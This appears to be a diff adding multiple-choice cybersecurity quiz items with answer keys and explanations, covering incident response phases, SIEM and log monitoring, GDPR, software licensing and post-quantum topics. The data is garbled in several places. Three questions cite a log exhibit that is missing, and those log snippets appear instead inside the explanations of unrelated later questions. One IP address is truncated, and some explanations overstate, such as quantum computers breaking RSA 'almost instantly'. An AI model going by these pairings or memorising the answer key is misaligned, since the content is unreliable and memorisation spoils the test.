+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 123,
+        "question": "(Scenario-Based) An investigator finds a suspect's computer is running a TrueCrypt container (encrypted volume). Why should they perform a \"Live Acquisition\" while the computer is still on?",
+        "options": [
+            {
+                "label": "A",
+                "text": "To save electricity."
+            },
+            {
+                "label": "B",
+                "text": "To extract the encryption keys from the RAM so the volume can be decrypted later."
+            },
+            {
+                "label": "C",
+                "text": "To prevent the computer from going into sleep mode."
+            },
+            {
+                "label": "D",
+                "text": "Live acquisition is the only way to see the desktop wallpaper."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "If the system is powered off, the volatile keys in RAM are lost. Without those keys, modern\nhigh-grade encryption (like AES-256) cannot be broken within a human lifetime using brute\nforce.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 124,
+        "question": "(Scenario-Based) A security analyst detects that a server is currently communicating with a known malicious Command and Control (C&C) IP address. The analyst immediately disconnects the server from the network. Which phase of the PICERL framework is this?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Identification"
+            },
+            {
+                "label": "B",
+                "text": "Containment"
+            },
+            {
+                "label": "C",
+                "text": "Eradication"
+            },
+            {
+                "label": "D",
+                "text": "Recovery"
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Containment is the phase where you stop the attack from spreading or causing further\ndamage. Disconnecting a machine prevents the attacker from sending further commands or\nexfiltrating more data.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 125,
+        "question": "(Conceptual) During which phase of the Incident Response process is the \"Root Cause Analysis\" performed to ensure the vulnerability is fully patched before the system goes back online?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Preparation"
+            },
+            {
+                "label": "B",
+                "text": "Identification"
+            },
+            {
+                "label": "C",
+                "text": "Eradication"
+            },
+            {
+                "label": "D",
+                "text": "Recovery"
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "Eradication involves identifying all affected components and completely removing the threat.\nThis includes finding how the attacker got in and fixing that weakness so they cannot return.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 126,
+        "question": "(Code/Logic) A CSIRT team is reviewing the following \"Post-Mortem\" log entry. Which phase of the IR lifecycle does this activity represent?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Preparation"
+            },
+            {
+                "label": "B",
+                "text": "Containment"
+            },
+            {
+                "label": "C",
+                "text": "Recovery"
+            },
+            {
+                "label": "D",
+                "text": "Lessons Learned"
+            }
+        ],
+        "correct_answer": "D",
+        "explanation": "The \"Lessons Learned\" phase occurs after the incident is resolved. It focuses on documenting\nthe cause and improving defenses and processes to prevent similar incidents in the future.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 127,
+        "question": "(Conceptual) What is the primary goal of the Recovery phase in incident management?",
+        "options": [
+            {
+                "label": "A",
+                "text": "To catch the hacker and put them in jail."
+            },
+            {
+                "label": "B",
+                "text": "To restore affected systems to their normal operational state and verify that they are functioning correctly without any remaining threats."
+            },
+            {
+                "label": "C",
+                "text": "To buy new hardware for the office."
+            },
+            {
+                "label": "D",
+                "text": "To hide the incident from the public."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "ir-meeting-notes.txt\n[REPORT]\n- The attacker used a SQL injection in the login form.\n- Action: Implement WAF rules and parameterized queries.\n- Result: Updated developer training manual for next year.\nRecovery is about getting back to business. It involves restoring from backups, re-testing\nsystem security, and gradually allowing production traffic back to the affected servers.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 128,
+        "question": "(Conceptual) In the context of the Identification phase, what is an Indicator of Compromise (IoC)?",
+        "options": [
+            {
+                "label": "A",
+                "text": "A tool used to encrypt a hard drive."
+            },
+            {
+                "label": "B",
+                "text": "A certificate issued by a trusted authority."
+            },
+            {
+                "label": "C",
+                "text": "A piece of forensic evidence (such as a specific file hash, IP address, or registry key) that indicates a high probability of a system breach."
+            },
+            {
+                "label": "D",
+                "text": "A backup of the system configuration."
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "IoCs are the \"fingerprints\" left behind by attackers. IR teams use known IoC lists to scan their\nnetworks to identify which machines have been infected by a specific piece of malware.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 129,
+        "question": "(Scenario-Based) An IR team is deciding between \"Live Imaging\" of a server versus \"Pulling the Plug.\" Which approach is preferred during Containment to ensure the best chance of successful analysis later?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Pulling the plug, to stop the malware instantly."
+            },
+            {
+                "label": "B",
+                "text": "Live Imaging / Memory Capture, to preserve volatile data like encryption keys and running processes."
+            },
+            {
+                "label": "C",
+                "text": "Deleting the infected folder immediately."
+            },
+            {
+                "label": "D",
+                "text": "Formatting the hard drive."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Modern IR prioritizes \"Live Response.\" Pulling the plug destroys the data in RAM, which often\ncontains the only copy of the keys needed to decrypt data or the \"command and control\"\naddresses the malware is using.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 130,
+        "question": "(Comparison) What is the difference between Short-term Containment and Long- term Containment?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Short-term is for software; Long-term is for hardware."
+            },
+            {
+                "label": "B",
+                "text": "Short-term is immediate isolation to stop the spread; Long-term involves installing temporary workarounds to allow business to continue while the root cause is investigated."
+            },
+            {
+                "label": "C",
+                "text": "Short-term is for 1 hour; Long-term is for 1 year."
+            },
+            {
+                "label": "D",
+                "text": "There is no functional difference."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Short-term containment is an emergency \"cut-off\" (e.g., blocking an IP). Long-term\ncontainment allows the business to keep running (e.g., using a backup server in a clean\nVLAN) while the main system is being scrubbed.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 131,
+        "question": "(Conceptual) Why is Communication Management considered a critical part of the Incident Response process?",
+        "options": [
+            {
+                "label": "A",
+                "text": "To tell the hacker that they have been caught."
+            },
+            {
+                "label": "B",
+                "text": "To ensure that stakeholders (Legal, HR, PR, and Executives) are informed of the status and to comply with data breach notification laws."
+            },
+            {
+                "label": "C",
+                "text": "To allow developers to chat during the fix."
+            },
+            {
+                "label": "D",
+                "text": "To speed up the internet connection."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "A security breach is a legal and PR event as much as a technical one. Many jurisdictions\nrequire companies to notify users of a breach within 72 hours. Failure to communicate\nproperly can lead to massive fines and lawsuits.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 132,
+        "question": "(Conceptual) What is the primary function of a SIEM (Security Information and Event Management) system?",
+        "options": [
+            {
+                "label": "A",
+                "text": "To encrypt all outgoing emails."
+            },
+            {
+                "label": "B",
+                "text": "To aggregate and correlate logs from multiple disparate sources to identify suspicious patterns or security incidents."
+            },
+            {
+                "label": "C",
+                "text": "To act as a primary database for user profiles."
+            },
+            {
+                "label": "D",
+                "text": "To manage the company's payroll."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "SIEM tools collect data from firewalls, antivirus, and servers. By \"correlating\" this data (e.g.,\nnoticing a failed login on Server A followed by an unusual file access on Server B), it can\ndetect complex attacks.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 133,
+        "question": "(Scenario-Based) A security analyst notices 5,000 failed login attempts from a single IP address within 1 minute. The SIEM triggers an alert labeled \"Brute Force Attack.\" This is an example of:",
+        "options": [
+            {
+                "label": "A",
+                "text": "Vulnerability Scanning"
+            },
+            {
+                "label": "B",
+                "text": "Real-time Monitoring and Correlation"
+            },
+            {
+                "label": "C",
+                "text": "Compliance Auditing"
+            },
+            {
+                "label": "D",
+                "text": "Digital Forensics"
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Real-time monitoring involves set thresholds (e.g., X fails in Y minutes). When the rule is met,\nthe system alerts the SOC team immediately.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 134,
+        "question": "(Comparison) How does Continuous Monitoring differ from a Vulnerability Scan?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Monitoring is only for hardware; Scans are for software."
+            },
+            {
+                "label": "B",
+                "text": "Monitoring is a 24/7 process of observing behavior; a Scan is a point-in-time assessment to find known missing patches or misconfigurations."
+            },
+            {
+                "label": "C",
+                "text": "Vulnerability scans are more secure."
+            },
+            {
+                "label": "D",
+                "text": "There is no difference."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Think of a Scan as a \"medical checkup\" you do once a month, and Monitoring as a \"heart-rate\nmonitor\" you wear all the time. Both are necessary but serve different purposes.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 135,
+        "question": "(Code/Logic) A Linux admin views the following log file. Which type of log is this?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Application Log"
+            },
+            {
+                "label": "B",
+                "text": "Network Flow Log"
+            },
+            {
+                "label": "C",
+                "text": "Authentication/Security Log"
+            },
+            {
+                "label": "D",
+                "text": "Kernel Log"
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "The auth.log (or secure log in some distros) specifically tracks login attempts, sudo\nusage, and SSH connections. It is the most important log for identifying brute force attacks.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 136,
+        "question": "(Conceptual) What is the goal of a Compliance Audit?",
+        "options": [
+            {
+                "label": "A",
+                "text": "To find and fix bugs in code."
+            },
+            {
+                "label": "B",
+                "text": "To verify that the organization's security controls meet specific regulatory requirements (like HIPAA or PCI-DSS)."
+            },
+            {
+                "label": "C",
+                "text": "To increase the network speed."
+            },
+            {
+                "label": "D",
+                "text": "To install new antivirus software."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "/var/log/auth.log\nMay 20 10:00:01 server sshd[1234]: Failed password for root from 192.16\nMay 20 10:00:05 server sshd[1234]: Failed password for root from 192.16\nCompliance audits are legal or contractual requirements. An auditor checks if you are \"doing\nwhat you said you would do\" to protect sensitive data.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 137,
+        "question": "(Scenario-Based) An attacker manages to compromise a server and immediately deletes the history files and system logs. Which security control would have prevented the loss of this audit trail?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Stronger passwords."
+            },
+            {
+                "label": "B",
+                "text": "A local firewall."
+            },
+            {
+                "label": "C",
+                "text": "Centralized Log Management (sending logs to a separate, write-only server)."
+            },
+            {
+                "label": "D",
+                "text": "A faster CPU."
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "If logs are sent to a remote Log Server (like Splunk or an ELK stack) in real-time, the attacker\ncan delete the local copies, but the security team will still have the record of what happened\non the remote server.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 138,
+        "question": "(Conceptual) In security monitoring, what is a \"True Negative\"?",
+        "options": [
+            {
+                "label": "A",
+                "text": "A system failure that is not recorded."
+            },
+            {
+                "label": "B",
+                "text": "When the monitoring system correctly identifies a legitimate action as safe and does not trigger an alert."
+            },
+            {
+                "label": "C",
+                "text": "An attacker who is not caught."
+            },
+            {
+                "label": "D",
+                "text": "A false alarm."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "True Negative is the \"ideal\" state for normal traffic. It means the system is working correctly by\nstaying silent when there is no threat.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 139,
+        "question": "(Conceptual) What is the function of NetFlow data in network monitoring?",
+        "options": [
+            {
+                "label": "A",
+                "text": "To read the contents of users' emails."
+            },
+            {
+                "label": "B",
+                "text": "To record metadata about network traffic (source, destination, ports, amount of data) without capturing the full packet payload."
+            },
+            {
+                "label": "C",
+                "text": "To block all incoming traffic."
+            },
+            {
+                "label": "D",
+                "text": "To encrypt the Wi-Fi signal."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "NetFlow is like a \"phone bill\" for the network. It doesn't tell you what was said (payload), but it\ntells you who called whom, when, and for how long. It is vital for detecting large-scale data\nexfiltration.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 140,
+        "question": "(Scenario-Based) A user in the European Union requests that a social media company delete all their photos, posts, and personal profile data because they no longer wish to use the service. Under GDPR, which principle is the user exercising?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Right to Data Portability"
+            },
+            {
+                "label": "B",
+                "text": "Right of Access"
+            },
+            {
+                "label": "C",
+                "text": "Right to Erasure (Right to be Forgotten)"
+            },
+            {
+                "label": "D",
+                "text": "Right to Rectification"
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "The Right to Erasure allows individuals to request the deletion of their personal data when\nthere is no compelling reason for its continued processing by the company.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 141,
+        "question": "(Conceptual) Which form of Intellectual Property is most commonly used to protect the actual source code of a software application from being copied by a competitor?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Copyright"
+            },
+            {
+                "label": "B",
+                "text": "Patent"
+            },
+            {
+                "label": "C",
+                "text": "Trademark"
+            },
+            {
+                "label": "D",
+                "text": "Service Mark"
+            }
+        ],
+        "correct_answer": "A",
+        "explanation": "Source code is treated as a \"literary work\" under international law. Therefore, it is\nautomatically protected by Copyright the moment it is written, preventing others from legally\ncopying the text of the code.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 142,
+        "question": "(Scenario-Based) A security researcher finds a critical vulnerability in a large bank's website. Instead of selling it on the dark web, they document it and send a private report to the bank's security team, giving them 90 days to fix it. This is known as:",
+        "options": [
+            {
+                "label": "A",
+                "text": "Full Disclosure"
+            },
+            {
+                "label": "B",
+                "text": "Responsible (Coordinated) Disclosure"
+            },
+            {
+                "label": "C",
+                "text": "Cyber Espionage"
+            },
+            {
+                "label": "D",
+                "text": "Intellectual Theft"
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Responsible disclosure is an ethical practice where researchers work with vendors to fix bugs\nbefore making them public, preventing attackers from exploiting the flaw in the meantime.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 143,
+        "question": "(Conceptual) What is the main legal issue addressed by the Computer Fraud and Abuse Act (CFAA)?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Software licensing fees."
+            },
+            {
+                "label": "B",
+                "text": "Accessing a computer or network \"without authorization\" or \"exceeding authorized access.\""
+            },
+            {
+                "label": "C",
+                "text": "The speed of the internet connection."
+            },
+            {
+                "label": "D",
+                "text": "The use of open-source libraries."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "The CFAA is the primary anti-hacking law. It criminalizes the act of breaking into systems,\nregardless of whether data was stolen or damage was done.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 144,
+        "question": "(Comparison) What is the difference between Proprietary and GPL (General Public License) software?",
+        "options": [
+            {
+                "label": "A",
+                "text": "GPL software is always free of cost."
+            },
+            {
+                "label": "B",
+                "text": "Proprietary software restricts the user's right to view or modify the source code; GPL requires that any modifications also be released under the same open-source terms."
+            },
+            {
+                "label": "C",
+                "text": "Proprietary software is only for Windows."
+            },
+            {
+                "label": "D",
+                "text": "GPL software is less secure."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "The GPL is a \"copyleft\" license. It ensures that software remains free and open, requiring\nanyone who distributes a modified version to share their code as well. Proprietary code is kept\nsecret as a trade secret.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 145,
+        "question": "(Conceptual) The GDPR principle of \"Data Minimization\" requires that organizations:",
+        "options": [
+            {
+                "label": "A",
+                "text": "Compress all their data using ZIP files."
+            },
+            {
+                "label": "B",
+                "text": "Only collect and process personal data that is strictly necessary for the specified purpose."
+            },
+            {
+                "label": "C",
+                "text": "Delete all data every 24 hours."
+            },
+            {
+                "label": "D",
+                "text": "Store data on the smallest possible hard drives."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Data minimization reduces risk. If you don't need a user's date of birth to provide a service,\nyou shouldn't ask for it. This limits the damage if a breach occurs.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 146,
+        "question": "(Scenario-Based) A professional \"Ethical Hacker\" is hired to test a company's defenses. Before starting, they sign a document defining exactly which IP addresses can be attacked and what methods are allowed. This document is called:",
+        "options": [
+            {
+                "label": "A",
+                "text": "A Service Level Agreement (SLA)"
+            },
+            {
+                "label": "B",
+                "text": "Rules of Engagement (RoE)"
+            },
+            {
+                "label": "C",
+                "text": "An End User License Agreement (EULA)"
+            },
+            {
+                "label": "D",
+                "text": "A Non-Disclosure Agreement (NDA)"
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "The RoE is a critical legal and ethical document. It prevents the hacker from accidentally\nattacking a client's partner or using a method that could crash a production server.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 147,
+        "question": "(Conceptual) What is the purpose of the DMCA (Digital Millennium Copyright Act) anti-circumvention provisions?",
+        "options": [
+            {
+                "label": "A",
+                "text": "To encourage users to share passwords."
+            },
+            {
+                "label": "B",
+                "text": "To make it illegal to create or use tools that bypass digital rights management (DRM) protections on copyrighted works."
+            },
+            {
+                "label": "C",
+                "text": "To allow users to download movies for free."
+            },
+            {
+                "label": "D",
+                "text": "To protect the privacy of email headers."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "The DMCA prohibits the \"circumvention\" of technical measures (like encryption or license\nkeys) that control access to copyrighted material like games, movies, and software.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 148,
+        "question": "(Conceptual) Why is Quantum Computing considered a major emerging threat to current cybersecurity standards?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Quantum computers are much faster at guessing passwords using simple brute force."
+            },
+            {
+                "label": "B",
+                "text": "Algorithms like Shor’s Algorithm running on a quantum computer can solve the mathematical problems behind RSA and ECC in polynomial time, rendering them obsolete."
+            },
+            {
+                "label": "C",
+                "text": "Quantum computers can physically melt traditional hard drives."
+            },
+            {
+                "label": "D",
+                "text": "Quantum computers do not use IP addresses, making them untraceable."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Most modern encryption (RSA/Diffie-Hellman) relies on the difficulty of integer factorization or\ndiscrete logarithms. A large-scale quantum computer can solve these problems almost\ninstantly, breaking the foundation of internet security.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 149,
+        "question": "(Scenario-Based) An attacker uses a generative AI model to create a \"Deepfake\" audio recording of a CEO's voice, tricking an employee into transferring funds. This is a modern evolution of which classic attack?",
+        "options": [
+            {
+                "label": "A",
+                "text": "SQL Injection"
+            },
+            {
+                "label": "B",
+                "text": "Man-in-the-Middle"
+            },
+            {
+                "label": "C",
+                "text": "Social Engineering (Vishing)"
+            },
+            {
+                "label": "D",
+                "text": "Cross-Site Scripting"
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "Deepfakes use AI to enhance social engineering. By mimicking a trusted voice or face\nperfectly, attackers can bypass traditional human \"gut feeling\" checks that used to catch\nscammers.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 150,
+        "question": "(Conceptual) In a Zero Trust Architecture, what is Micro-segmentation?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Dividing a hard drive into very small partitions."
+            },
+            {
+                "label": "B",
+                "text": "Dividing the network into granular zones to control lateral movement, where access between two internal servers requires explicit authorization."
+            },
+            {
+                "label": "C",
+                "text": "Reducing the size of the network packets."
+            },
+            {
+                "label": "D",
+                "text": "Allowing only one user to log in at a time."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Traditional security was like a castle with a moat (one big perimeter). Micro-segmentation is\nlike having a lock on every single door inside the castle, ensuring that if an attacker enters one\nroom, they are still blocked from the rest.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 151,
+        "question": "(Comparison) What is the primary benefit of Post-Quantum Cryptography (PQC) over traditional RSA encryption?",
+        "options": [
+            {
+                "label": "A",
+                "text": "PQC is faster on traditional CPUs."
+            },
+            {
+                "label": "B",
+                "text": "PQC uses smaller keys."
+            },
+            {
+                "label": "C",
+                "text": "PQC is based on mathematical problems (like shortest vector problems in lattices) that are believed to be resistant to both classical and quantum computer attacks."
+            },
+            {
+                "label": "D",
+                "text": "PQC does not require electricity to run."
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "PQC aims to replace current standards with algorithms that even a quantum computer cannot\nsolve efficiently, ensuring long-term data confidentiality.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 152,
+        "question": "(Code/Logic) A security team is deploying an AI-based Anomaly Detection system. Based on the following log, why did the AI trigger an alert despite a valid login?",
+        "options": [
+            {
+                "label": "A",
+                "text": "The password was incorrect."
+            },
+            {
+                "label": "B",
+                "text": "The IP address was blocked."
+            },
+            {
+                "label": "C",
+                "text": "Behavioral Analysis: The unusual time and massive data transfer deviated significantly from the established user baseline."
+            },
+            {
+                "label": "D",
+                "text": "The admin was using a mobile device."
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "Modern AI security doesn't just look at \"right or wrong\" credentials. It looks at behavior. An\nadmin logging in at 3 AM and downloading 50GB of data is a high-probability indicator of a\ncompromised account or insider threat.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 153,
+        "question": "(Conceptual) How can Blockchain technology be used to improve cybersecurity in supply chain management?",
+        "options": [
+            {
+                "label": "A",
+                "text": "By making the data transfer faster."
+            },
+            {
+                "label": "B",
+                "text": "By providing an immutable, transparent record of every hardware and software component, preventing the injection of counterfeit or malicious parts."
+            },
+            {
+                "label": "C",
+                "text": "By replacing the need for firewalls."
+            },
+            {
+                "label": "D",
+                "text": "By automatically deleting viruses."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Blockchain's immutability ensures that once a record is entered, it cannot be secretly altered.\nThis provides a \"chain of trust\" for software updates and hardware components.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 154,
+        "question": "(Scenario-Based) An organization adopts SASE (Secure Access Service Edge). What does this emerging trend combine?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Hardware routers and physical security guards."
+            },
+            {
+                "label": "B",
+                "text": "WAN capabilities (networking) with cloud-native security functions (like firewalls and CASB) into a single service model."
+            },
+            {
+                "label": "C",
+                "text": "Blockchain and AI."
+            },
+            {
+                "label": "D",
+                "text": "Desktop security and mobile security."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "ai-security-monitor.log [EVENT] User 'Admin' Login: SUCCESS [ANALYSIS] IP: 192.168.5.10 (Known) [ANALYSIS] Time: 03:15 AM (Unexpected) [ANALYSIS] Payload: 50GB egress in 2 minutes (Anomaly) [ACTION] BLOCK_ACCOUNT_TEMPORARILY SASE (pronounced \"sassy\") is a cloud-native architecture that delivers both network and\nsecurity services directly to the user's device, regardless of where they are, rather than forcing\neverything through a central data center.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 155,
+        "question": "(Conceptual) What is Homomorphic Encryption?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Encryption that uses the same key for everyone."
+            },
+            {
+                "label": "B",
+                "text": "A type of encryption that allows mathematical computations to be performed on ciphertext, producing an encrypted result that, when decrypted, matches the result of the operations on the plaintext."
+            },
+            {
+                "label": "C",
+                "text": "Encryption that changes every hour."
+            },
+            {
+                "label": "D",
+                "text": "A method for encrypting only human DNA data."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "This is a \"holy grail\" of privacy. It allows a cloud provider to process your data (e.g., calculate\nyour taxes) without the provider ever actually \"seeing\" your private numbers.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    }
+]
